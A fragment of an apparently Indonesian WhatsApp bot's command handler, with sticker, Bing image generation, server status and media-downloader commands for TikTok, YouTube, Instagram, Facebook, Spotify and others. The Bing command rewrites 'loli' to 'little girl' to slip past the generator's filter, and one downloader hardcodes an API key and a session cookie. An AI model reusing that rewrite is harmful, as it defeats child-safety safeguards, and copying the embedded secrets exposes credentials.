} catch (e) {
}
}
break
 //=================================================//
case 'swm': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let [teks1, teks2] = text.split`|`
if (!teks1) return m?.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (!teks2) return m?.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (/image/.test(mime)) {
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m?.reply('Maksimal 10 detik!')
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
return m?.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case "bingimg-2d": {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return m?.reply("[ ! ] masukan prompt gambar yang mau di bikin");
let teksu = text.replace(/loli/gi, "anak gadis kecil");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
ptz.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: m });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m?.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await m?.reply('No images found after filtering.');
}
} catch (error) {
await m?.reply('An error occurred while processing the request.');
}
};
break
//=================================================//
case "ping":
case "botstatus":
case "statusbot": {   
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date2 = new Date();
var jam = date2.getHours();
var menit = date2.getMinutes();
var detik = date2.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();
let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm?.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
.join("\n\n")}`
: ""
}
`.trim();
ptz.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: respon,
contextInfo: {
mentionedJid: [m?.sender],
externalAdReply: {
showAdAttribution: true
}}}}}}, {})
}
break
/*
 - *[ TIKTOK - DOWNLOAD ]*
 - https://whatsapp.com/channel/0029Vae6iYe30LKGkbTvBC3E
*/
case 'tt':
case 'tiktok':
case 'ttt': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return m.reply(`Contoh : ${prefix + command} linknya`)
m.reply('Sedang Diproses ⏳')
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await ptz.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
ptz.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
ptz.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break
    case 'ttsh': case 'tiktoksearch':{
        let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return reply(`Use it by the way: ${prefix+command} *query*\n\n_Example_\n\n${prefix+command} khaby lame`)
ptz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
const capt = anu.result.title
await ptz.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
reply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
case 'ttmp4':
case 'tiktokvideo':
case 'tiktokmp4': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!q) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
ptz.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokmp3':
case 'tiktokaudio':{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!q) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
const Lorenzotikmp3 = {url:data.audio}
ptz.sendMessage(m.chat, { audio: Lorenzotikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case'ttslide': case 'tiktokslide':{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return reply(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
ptz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://widipe.com/download/tiktokslide?url=${text}`)
await ptz.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ptz.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
		//downlod yt
		case 'ytmp46': {
if (!text) return m.reply('Silakan masukkan tautan YouTube yang ingin diunduh.');

  try {
    // Mengakses API
    const response = await fetch(`https://api.agatz.xyz/api/ytmp4?url=${encodeURIComponent(text)}`);
    const json = await response.json();

    if (json.status !== 200) throw new Error("Gagal mengambil data video.");
    const videoData = json.data;

    // Mencari kualitas 480p
    const selectedVideo = videoData.find(item => item.quality === "480p");

    // Jika kualitas 480p tersedia
    if (selectedVideo) {
      const caption = `📹 *Judul:* ${json.data.title}\n🎞️ *Kualitas:* ${selectedVideo.quality}\n\nSedang mengirim video...`;

      // Mengirim video
      await ptz.sendMessage(m.chat, { video: { url: selectedVideo.media }, caption: caption }, { quoted: m });
    } else {
      reply("Kualitas 480p tidak tersedia. Silakan coba kualitas lainnya.");
    }
  } catch (error) {
    console.error(error);
    reply("Maaf, terjadi kesalahan dalam mengambil video.");
  }
};
break
    case 'ytmp45':
let usernye = global.db.data.users[m.sender]
if (usernye.registered === false) return reply(mess.notregist);
if (!text) return reply(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`);
        ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });
  try {
    let searchResponse = await ytdlnew(text);
    ptz.sendMessage(m.chat,{ video: { url: searchResponse.mp4DownloadLink },mimetype: 'video/mp4', caption: '*☘️ udh'},{ quoted: m }
                   );
    ptz.sendMessage(m.chat, {react:{text: '☑️', key:m.key}});
} catch (error) {
    console.error(error);
    m.reply('*error jir*');
}
break
case 'ytmp35':
    let userny = global.db.data.users[m.sender]
if (userny.registered === false) return reply(mess.notregist);
if (!text) return reply(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)

        ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

  try {
    let searchResponse = await ytdlnew(text);
    ptz.sendMessage(m.chat,{audio:{ url:searchResponse.mp3DownloadLink},mimetype:'audio/mp4', ptt:false},{quoted:m}
    );
     ptz.sendMessage( m.chat, { react:{ text: '☑️', key: m.key }});
  } catch (error) {
    console.error(error);
    m.reply('*error jir*');
  }
        break
    case 'ytmp32' : case 'yta' : case 'ytaudio': { 
        let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
       if(!text) return reply(`Example: .${command} linknya`)
       //reply(mess.wait)
reply(mess.wait)
fg.ytmp3(!text).then( data => {
ptz.sendMessage(m.chat, { audio: { url: data.dl_url }, mimetype: 'audio/mp4' })
})
}
break
    case 'ytmp33': case 'ytaudio1':
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let Lorenzoaudp3 = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !Lorenzoaudp3.isYTUrl(text)) return reply(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
let audio = await Lorenzoaudp3.mp3(text)
await ptz.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
    case 'ytmp34' : {
        let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
 if (!text) return reply('Enter Title / Link From YouTube!');
 reply(mess.wait)
 try {
 	let search = require("yt-search");
let { youtube } = require("btch-downloader");
 const look = await search(text);
 const convert = look.videos[0];
 if (!convert) return reply('Video/Audio Tidak Ditemukan');
 if (convert.seconds >= 3600) {
 return reply(m.chat, 'Video is longer than 1 hour!');
 } else {
 let audioUrl;
 try {
 audioUrl = await youtube(convert.url);
 } catch (e) {
 reply(mess.wait)
 audioUrl = await youtube(convert.url);
 }

 await ptz.sendMessage(m.chat, {
 audio: {
 url: audioUrl.mp3
 },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: convert.title,
 body: "",
 thumbnailUrl: convert.image,
 sourceUrl: audioUrl.mp3,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 });
 }
 } catch (e) {
 reply(m.chat, `*Error:* ` + e.message);
 }
};
break
    case 'ytmp42' : case 'ytv' : case 'ytvideo': { 
       let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
       if(!text) return reply(`Example: .${command} linknya`)
       reply(mess.wait)
fg.ytmp4(!text).then( data => {
ptz.sendMessage(m.chat, { video: { url: data.dl_url }, caption: data.title })
})
}
break
    case 'ytmp43':
case 'playmp4':
   /* let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);*/
 //   if (!isGroup) return onlyGroup()
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=9174374619a0353273a70311&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					/*tz.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {*/
						ptz.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					//})
				})
				.catch(console.error)
			break
    case 'play': case 'song': {  
                if (!text) return reply(`Example : ${prefix + command} Hey Daddy Home`)
                reply(mess.wait)
                /*if (global.db.data.users[m.sender].limit < 3) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3
            reply('_🚩 3 limit Terpakai!!.._')*/
                let yts = require('yt-search')
                let search = await yts(`${text}`)
                let linknya = search.all[0].url
                let bodytextnya = `ᴛɪᴛʟᴇ : *${search.all[0].title}*\nᴠɪᴇᴡs : *${search.all[0].views}*\nᴅᴜʀᴀᴛɪᴏɴ : *${search.all[0].timestamp}*\nᴜᴘʟᴏᴀᴅᴇᴅ : *${search.all[0].ago}*\nᴜʀʟ : *${linknya}*`
               // conn.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
                
            let bokepp = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bodytextnya
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : { url : search.all[0].thumbnail }}, { upload: ptz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Video 🎬","id":"${prefix}ytmp4 ${linknya}"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Audio 🎧","id":"${prefix}ytmp3 ${linknya}"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: botname,
                    newsletterJid: '120363310531380313@newsletter',
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await ptz.relayMessage(bokepp.key.remoteJid, bokepp.message, {
  messageId: bokepp.key.id
})
            }
            break
    case 'aio': {
        let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return reply('Masukkan link nya!')
//await loading()
reply(mess.wait)

try {
 let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
 await ptz.sendMessage(m.chat, {video: {url: gtAu.url}, caption: `Done!`}, {quoted: m})
} catch (e) {
 reply('Tidak dapat mendownload video')
}

try {
 let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,"isAudioOnly":"true"}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
 await ptz.sendMessage(m.chat, {audio: {url: gtAu.url}, mimetype: 'audio/mp4', ptt: false}, {quoted: m})
} catch (e) {
 reply('Tidak dapat mendownload audio')
}

}
break
   case 'igdl': case 'ig': case 'igdlmp4': {
       let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *url*`)
reply(mess.wait)
var anu = await fetchJson(`https://meitang.xyz/download/igdl?url=${text}`)
var hassdl = anu.result[0].url
await ptz.sendMessage(m.chat, {
video: {
url: hassdl,
caption: '*Succes Sayang UwU*'
}
}, {
quoted: m
})
}
break
	/*case 'ig': case 'igdl': {
  if (!text) return reply("Example: .igdl ig reels\n\nonly reels")
async function igdl(url) {
  return new Promise(async (resolve, reject) => {
    const payload = new URLSearchParams(
      Object.entries({
        url: url,
        host: "instagram"
      })
    )
    await axios.request({
      method: "POST",
      baseURL: "https://saveinsta.io/core/ajax.php",
      data: payload,
      headers: {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        cookie: "PHPSESSID=rmer1p00mtkqv64ai0pa429d4o",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
      }
    })
    .then(( response ) => {      
      const $ = cheerio.load(response.data)
      const mediaURL = $("div.row > div.col-md-12 > div.row.story-container.mt-4.pb-4.border-bottom").map((_, el) => {
        return "https://saveinsta.io/" + $(el).find("div.col-md-8.mx-auto > a").attr("href")
      }).get()
      const res = {
        status: 200,
        media: mediaURL
      }
      resolve(res)
    })
    .catch((e) => {
      console.log(e)
      throw {
        status: 400,
        message: "error",
      }
    })
  })
}
let kanjutgedeu = await igdl(text)
ptz.sendMessage(m.chat, {video: {url: kanjutgedeu.media}, caption: 'succes'}, {quoted: m})
}
break*/
   /* case 'tourl': {
        if (!text) return reply('reply/send image to caption .tourl')
    let q = m.quoted ? m.quoted : m
	let mime = q.mediaType || ''
	if (/image|video|audio|sticker|document/.test(mime)) {
		let media = await q.download(true)
		let data = await uploadFile(media)
		m.reply(data.files[0].url)
	} else throw 'No media found'
        }
    break*/
    case 'pinterest': case 'pin': {
        let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
  if (!text) return reply(`Title?`);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: ptz.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `_*Here is the result of: ${text}*_`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Image - ${i++}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});
  await ptz.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
    case "facebook": case "fb": case "fbdl": {
if (!text) return reply("linkvidionya")
if (!/facebook.com/.test(text)) return reply("Link Tautan Tidak Valid!")
reply(mess.wait)
await fetchJson(`https://meitang.xyz/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return reply(JSON.stringify(res, null, 2))
ptz.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `*Facebook Downloader Done ✅*`}, {quoted: m})
}).catch(e => reply(e.toString()))
}
break
    case 'fb':
case 'fbdl':
case 'facebook': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('facebook.com')) return m.reply('Harus berupa link facebook!')
ptz.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let hua = await fetchJson(`https://skizoasia.xyz/api/facebook?apikey=${API.SKIZO}&url=${text}`)
return await ptz.sendMessage(m.chat, { video: { url: hua.url }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
m.reply('Kesalahan pada API skizo.tech:', err)
/*try {
let anu = await bochil.snapsave(text)
return await slimecode.sendMessage(m.chat, { video: { url: anu[0].url }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada bochil.snapsave:', err)*/
try {
let anu = await fg.fbdl(text)
return await ptz.sendMessage(m.chat, { video: { url: anu.videoUrl }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada dylux.fbdl:', err)
/*try {
let anu = await snapsave(text)
return await ptz.sendMessage(m.chat, { video: { url: anu.links["Download High Quality"] }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada snapsave:', err)
try {
let anu = await snapsavev2(text)
return await ptz.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada snapsavev2:', err)*/
m.reply('Terjadi kesalahan')
}}
}
break
    /*case 'git2': case 'gitclone2':
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon`)
if (!isUrl(!args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ptz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break*/
    case 'git': case 'gitclone':
        /*if (global.db.data.users[m.sender].limit < 10) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 10*/
     if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/kkreyuk/file`)
if (!args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex2 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, userr, repo] = args[0].match(regex2) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${userr}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ptz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply('error om :<'))
        //reply('_10 Limit Terpakai_')
break
    case 'spotify2':{
	if (!text) return reply(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return reply('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return reply('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return reply( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "FallZx-Features",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: saluran,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await ptz.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return reply('*Error*')
    }
    }
    break
    case 'spotify3': {
        let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return reply(`Contoh : ${prefix + command} tada koe hitotsu`)
reply('*Sek loading*')
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `乂 *S P O T I F Y*

*Title*: ${api.data[0].title}
*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
ptz.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": 'sᴘᴏᴛɪғʏ ʙʏ ᴄʏʏxᴇʀᴏ ᴀɪ',
"body": `ᴄʏʏxᴇʀᴏ ᴀɪ`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/50afb355fac55370492de.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: m})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
ptz.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `ꜱᴘᴏᴛɪꜰʏ ʙʏ ᴄʏʏxᴇʀᴏ ᴀɪ`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/d8283bf6f948413ad0e62.jpg', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
break
    case 'spotify':{
    if (!text) await reply('link nya mana nih')    
    try {    
    const xyonz = fetchJson(`https://api.xyzen.tech/api/downloader/spotify?url=${text}&apikey=${API.XYZ}`)   
    let te = ` 
┌─⊷ *SPORTY DOWNLOAD *
> Description: ${xyonz.data}
> title: ${xyonz.title}
> artis : ${xyonz.artist}
> duration : ${xyonz.duration}
└───────────`
        ptz.sendMessage(m.chat, {audio: xyonz.download, caption: te}, {quoted: m})                  
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return reply('*Error*')
    }
}
break 
    case 'loli': {
        let user = global.db.data.users[m.sender]
